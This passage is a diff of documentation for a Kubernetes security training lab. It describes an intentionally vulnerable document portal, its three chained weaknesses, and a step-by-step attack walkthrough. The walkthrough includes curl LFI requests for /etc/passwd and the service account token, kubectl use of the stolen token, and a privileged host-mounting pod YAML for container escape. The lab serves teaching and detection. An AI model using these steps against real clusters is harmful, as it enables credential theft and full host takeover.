@@ -148,3 +148,173 @@ VM3 (Kali) ──curl──> VM2:30270 (LFI) ──token──> VM1:6443 (API) �
 
 **Key fields students find in Kibana:**
 - `sourceIPs`: attacker's IP (192.168.50.20)
+- `user.username`: service account used (system:serviceaccount:vuln-app:vuln-sa)
+- `verb`: what action was taken (create, get, list)
+- `objectRef.resource`: what was targeted (pods, nodes)
+- `annotations.authorization.k8s.io/reason`: why it was permitted (RBAC: allowed by ClusterRoleBinding "vuln-sa-admin")
+
+### NSA/CISA Kubernetes Hardening Guide v1.2
+**What:** Published August 2022 by NSA and CISA. Provides security recommendations for Kubernetes deployments.
+
+**Why we used it:** Authoritative government reference for K8s security. Directly aligns with our lab topic.
+
+**Sections we reference:**
+- Section 4: Recommends enforcing Pod Security Standards
+- Section 5: Recommends least-privilege RBAC and not auto-mounting service account tokens
+
+---
+
+## 5. The Vulnerable Application
+
+### What Is It?
+A Python web application running inside a Kubernetes pod on VM2. It simulates an "Internal Document Portal v2.1" for internal employees to read documents.
+
+### How Is It Built?
+- **Image:** `python:3.9-slim` (pre-cached on VM2)
+- **Runtime:** Inline Python HTTP server defined directly in the pod YAML, no custom Docker image needed
+- **Endpoints:**
+  - `/`: Main page with HTML links to read files
+  - `/read?file=FILENAME`: Reads a file from disk and returns its contents
+- **Dummy files:** `welcome.txt`, `readme.txt`, `changelog.txt` created at startup
+- **ServiceAccount:** `vuln-sa` in namespace `vuln-app`
+- **Exposed via:** NodePort service `webapp-svc` on port 30270
+- **imagePullPolicy:** `IfNotPresent` (for airgapped operation)
+
+### The LFI Vulnerability
+The `/read?file=` endpoint takes a filename from the user and opens it with Python's `open()` function without any path validation. The developer expected only filenames like `welcome.txt` but there's no check.
+
+- `?file=welcome.txt` → reads legitimate file (normal use)
+- `?file=/etc/passwd` → reads system file (confirms LFI)
+- `?file=/var/run/secrets/kubernetes.io/serviceaccount/token` → reads K8s token (the exploit)
+
+### Why Is LFI Realistic?
+LFI is in the OWASP Top 10 under "Broken Access Control." Many web apps that serve files (document portals, log viewers, config editors) are vulnerable when developers don't sanitize file paths. Internal tools especially get less security review because developers assume "it's only internal."
+
+---
+
+## 6. The Three Vulnerabilities
+
+### Vulnerability 1: Local File Inclusion (LFI)
+**What:** Webapp reads any file the user asks for without validation.
+**Impact:** Attacker reads the service account token from inside the pod.
+**If fixed:** Attack stops at step 1. Attacker sees a normal webapp with nothing to exploit.
+**Danger level:** Least dangerous alone: it can only read files inside the container.
+
+### Vulnerability 2: RBAC Over-Permission
+**What:** The `vuln-sa` service account has `cluster-admin` via `ClusterRoleBinding vuln-sa-admin`. This is the highest privilege in Kubernetes: it can do anything to any resource anywhere.
+**Impact:** The stolen token gives the attacker full control over the entire cluster.
+**If fixed:** Token is useless. Can only list pods in one namespace. Attack stops at step 4.
+**Danger level:** Most dangerous. Even without LFI, if this token leaks through any other way (git repo, logs, backup), it's game over.
+
+### Vulnerability 3: No Pod Security Standards
+**What:** The `vuln-app` namespace has no PSS label, so Kubernetes accepts any pod spec.
+**Impact:** Attacker creates a privileged pod with host filesystem access. Complete container escape.
+**If fixed:** Kubernetes rejects the privileged pod immediately. Attack stops at step 5.
+**Danger level:** Second most dangerous. Without PSS, anyone with pod-create permission can escape to the host.
+
+### How They Chain Together
+LFI opens the door → RBAC gives the keys → No PSS lets the attacker walk out of the building.
+
+Remove any one and the full attack chain breaks.
+
+---
+
+## 7. The Complete Attack Chain
+
+### Scenario
+An internal penetration tester has network access (they're on the internal network) but no Kubernetes credentials. They're testing what damage someone with just network access could do, like a compromised employee laptop.
+
+### Phase 1: Reconnaissance & Discovery (Kali)
+
+**Step 1:** Attacker knows the organization uses an internal document portal. They access it:
+```bash
+curl http://192.168.50.11:30270/
+```
+Output: HTML page showing "Internal Document Portal v2.1" with links to files.
+
+**Step 2:** Normal use, reads a legitimate file:
+```bash
+curl http://192.168.50.11:30270/read?file=welcome.txt
+```
+Output: Welcome text. But the `?file=` parameter reads directly from disk.
+
+**Step 3:** Tests LFI with a system file:
+```bash
+curl "http://192.168.50.11:30270/read?file=/etc/passwd"
+```
+Output: System passwd file. Confirms the app reads ANY file without validation.
+
+**Step 4:** Steals the Kubernetes service account token:
+```bash
+curl "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token"
+```
+Output: A long JWT token string. Every K8s pod has this at a well-known path.
+
+**Step 5:** Saves token and scans for the API server:
+```bash
+TOKEN=$(curl -s "http://192.168.50.11:30270/read?file=/var/run/secrets/kubernetes.io/serviceaccount/token")
+nmap -p 6443 192.168.50.0/24 --open
+```
+Output: 192.168.50.10 has port 6443 open (standard K8s API port).
+
+**Step 6:** Tests cluster access with the stolen token:
+```bash
+kubectl --server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify get nodes
+```
+Output: Both nodes listed as Ready. Token works.
+
+**Step 7:** Enumerates RBAC bindings:
+```bash
+kubectl ... get clusterrolebindings
+```
+Output: Long list of system bindings. At the bottom: `vuln-sa-admin` bound to `cluster-admin`. Suspicious.
+
+**Step 8:** Inspects the binding:
+```bash
+kubectl ... get clusterrolebinding vuln-sa-admin -o yaml
+```
+Output shows:
+- `roleRef.name: cluster-admin`, god mode permissions
+- `subjects.name: vuln-sa`, the same service account whose token was stolen
+- `kind: ClusterRoleBinding`, applies across the entire cluster, not just one namespace
+
+### Phase 2: Privilege Escalation (Kali)
+
+**Step 1:** Examines the attack pod YAML (`~/Desktop/pwned.yaml`):
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pwned
+  namespace: vuln-app
+spec:
+  nodeName: worker
+  hostPID: true
+  hostNetwork: true
+  containers:
+  - name: pwned
+    image: nginx
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: hostfs
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
+```
+
+What makes this dangerous:
+- `privileged: true`, disables ALL container isolation
+- `hostPID: true`, pod can see all host processes
+- `hostNetwork: true`, pod shares the host's network
+- `hostPath: /` at `/host`, entire host filesystem accessible
+- `nodeName: worker`, forces the pod onto VM2 where the flag is
+
+**Step 2:** Deploys the privileged pod:
+```bash
+kubectl ... apply -f ~/Desktop/pwned.yaml
+```
+
